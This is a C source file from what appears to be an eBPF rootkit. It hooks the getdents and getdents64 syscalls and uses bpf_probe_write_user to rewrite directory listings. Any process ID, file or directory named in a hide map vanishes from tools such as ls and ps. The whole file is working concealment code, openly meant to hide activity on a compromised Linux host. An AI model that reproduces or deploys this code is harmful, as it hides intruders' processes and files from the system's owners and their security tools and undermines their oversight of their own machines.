/**
 * Main code logic for hiding processes.
 * 
 * @author Yekuuun
 */

#ifndef MOD_HIDE_FROM_H
#define MOD_HIDE_FROM_H

#include "../includes/bpf_config.h"
#include "../includes/bpf_common.h"
#include "../includes/bpf_structs.h"
#include "../includes/bpf_debug.h"
#include "../includes/bpf_events_handler.h"
#include "../data/bpf_events.h"
#include "../data/bpf_ringbuf.h"
#include "../lib/ftlib.h"

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  HIDE PROCESSES
// └────────────────────────────────────┘
//----------------------------------------------------

#define MAX_DIR_ITER_LOOP 10000

/**
 * Used in context for bpf_loop since we may be looping on large buffer returned from commands like ls -la /proc
 * bpf_loop support large looping iteration.
 * 
 * Stored the persistent state between iterations.
 */
typedef struct getdents_loop_ctx {
    char   syscall_name[64];
    struct linux_dirent64 *dirp;
    struct linux_dirent64 *last; //last valid.
    __u64  curr_offset;
    long   ret;
} getdents_loop_ctx;

/**
 * Main callback called by bpf_loop() when iterating througt dirp entries
 * @param index => current iteration number 
 * @param data  => ptr to ctx passed in bpf_loop()
 */
static long __process_dirent_entry(__u32 index, void *data)
{
    struct getdents_loop_ctx *lctx = (struct getdents_loop_ctx*)data;
    if(!lctx)
        return 1;

    struct linux_dirent64 *curr = (struct linux_dirent64*)((char*)lctx->dirp + lctx->curr_offset);

    //end user space buff.
    if(lctx->curr_offset >= (__u64)lctx->ret)
        return 1;
    
    //quick validation on d_reclen.
    __u16 d_reclen = 0;
    if (bpf_probe_read_user(&d_reclen, sizeof(__u16), &curr->d_reclen) < 0)
        return 1;

    if(d_reclen < sizeof(struct linux_dirent64))
        return 1;

    //collect data.
    char d_name[DNAME_MAX] = {0};
    __u8 d_type            = DT_REG;

    if (bpf_probe_read_user(&d_type, sizeof(__u8), &curr->d_type) < 0) {
        lctx->curr_offset += d_reclen;
        return 0; // Skip unreadable entry - move to next.
    }

    if (bpf_probe_read_user_str(d_name, DNAME_MAX, curr->d_name) < 0) {
        lctx->curr_offset += d_reclen;
        return 0; // Skip unreadable name - move to next.
    }

    // PRINT_DEBUG("CURRENT D_NAME Threated : %s", d_name);

    __u8 *hidden = NULL;
    if (ft_isnumeric(d_name, PID_STR_MAX)) {
        int pid = ft_atoi(d_name, PID_STR_MAX);
        hidden  = bpf_map_lookup_elem(&hide_pid_cache, &pid);
    } 
    else {
        // Name isn't numeric - use d_type to pick the correct cache.
        if (d_type == DT_DIR)
            hidden = bpf_map_lookup_elem(&hide_cache_dir, &d_name);
        else
            hidden = bpf_map_lookup_elem(&hide_cache_file, &d_name);
    }

    if(hidden && *hidden == 1){
        char event_str[128];
        BPF_SNPRINTF(event_str, sizeof(event_str), "Hooked d_name => %s.", d_name);

        send_event(EVENT_TRIGGERED, lctx->syscall_name, event_str);

        if(lctx->last != NULL){
            __u16 last_reclen = 0;
            bpf_probe_read_user(&last_reclen, sizeof(__u16), &lctx->last->d_reclen);

            //Extend last's record to cover tmp's space - effectively skipping it.
            __u16 new_len = last_reclen + d_reclen;
            bpf_probe_write_user(&lctx->last->d_reclen, &new_len, sizeof(__u16));
        }   
    }
    else {
        lctx->last = curr;
    }

    lctx->curr_offset += d_reclen;
    return 0;
}

/**
 * Capture __x64_sys_getdents64 context using kprobe.
 */
SEC("tp/syscalls/sys_enter_getdents64")
int tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx)
{
    if(!__is_target_bin())
        return 0;

    __u64 dirp = (__u64)ctx->dirent;
    __u64 key  = bpf_get_current_pid_tgid(); //64 bits value returned.

    bpf_map_update_elem(&getdents_cache, &key, &dirp, BPF_ANY);
    PRINT_DEBUG("Event ! Saving __user dirent64 addr in cache for dirp : 0x%llx & key : %lld", (unsigned long long)dirp, (unsigned long long)key);

    return 0;
}

/**
 * Capture __x64_sys_getdents context using kprobe.
 */
SEC("tp/syscalls/sys_enter_getdents")
int tp_sys_enter_getdents(struct sys_getdents_enter_ctx *ctx)
{
    if(!__is_target_bin())
        return 0;

    __u64 dirp = (__u64)ctx->dirent;
    __u64 key  = bpf_get_current_pid_tgid(); //64 bits value returned.

    bpf_map_update_elem(&getdents_cache, &key, &dirp, BPF_ANY);
    PRINT_DEBUG("Event ! Saving __user dirent64 addr in cache for dirp : 0x%llx & key : %lld", (unsigned long long)dirp, (unsigned long long)key);

    return 0;
}


/**
 * Handle return from __x64_sys_getdents64 & manip.
 */
SEC("tp/syscalls/sys_exit_getdents64")
int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx)
{
    long ret = ctx->ret;

    if(ret <= 0)
        return ret;

    //get from cache.
    __u64 key  = bpf_get_current_pid_tgid();

    __u64 *cache_val = bpf_map_lookup_elem(&getdents_cache, &key);
    if(!cache_val)
        return ret;
    
    PRINT_DEBUG("Cache triggered ! tp/syscalls/sys_exit_getdents64. Infos => dirp : 0x%llx & key : %lld", (unsigned long long)(*cache_val), (unsigned long long)key);

    struct linux_dirent64 *dirp = (struct linux_dirent64*)(*cache_val);

    //del entry cached.
    bpf_map_delete_elem(&getdents_cache, &key);

    //preparing bpf_loop ctx.
    struct getdents_loop_ctx lctx = {
        .syscall_name = "__x64_sys_getdents64",
        .dirp         = dirp,
        .last         = NULL,
        .curr_offset  = 0,
        .ret          = ret
    };

    long nr_completed = bpf_loop(MAX_DIR_ITER_LOOP, __process_dirent_entry, &lctx, 0);

    return ret;
}

/**
 * Handle return from __x64_sys_getdents & manip.
 */
SEC("tp/syscalls/sys_exit_getdents")
int tp_sys_exit_getdents(struct sys_getdents_exit_ctx *ctx)
{
    long ret = ctx->ret;

    if(ret <= 0)
        return ret;

    if(!__is_target_bin())
        return ret;

    //get from cache.
    __u64 key  = bpf_get_current_pid_tgid();

    __u64 *cache_val = bpf_map_lookup_elem(&getdents_cache, &key);
    if(!cache_val)
        return ret;
    
    PRINT_DEBUG("Cache triggered ! tp/syscalls/sys_exit_getdents64. Infos => dirp : 0x%llx & key : %lld", (unsigned long long)(*cache_val), (unsigned long long)key);

    struct linux_dirent64 *dirp = (struct linux_dirent64*)(*cache_val);

    //del entry cached.
    bpf_map_delete_elem(&getdents_cache, &key);

    //preparing bpf_loop ctx.
    struct getdents_loop_ctx lctx = {
        .syscall_name = "__x64_sys_getdents",
        .dirp         = dirp,
        .last         = NULL,
        .curr_offset  = 0,
        .ret          = ret
    };

    long nr_completed = bpf_loop(MAX_DIR_ITER_LOOP, __process_dirent_entry, &lctx, 0);

    return ret;
}


//-----------------------------------------------------

#endif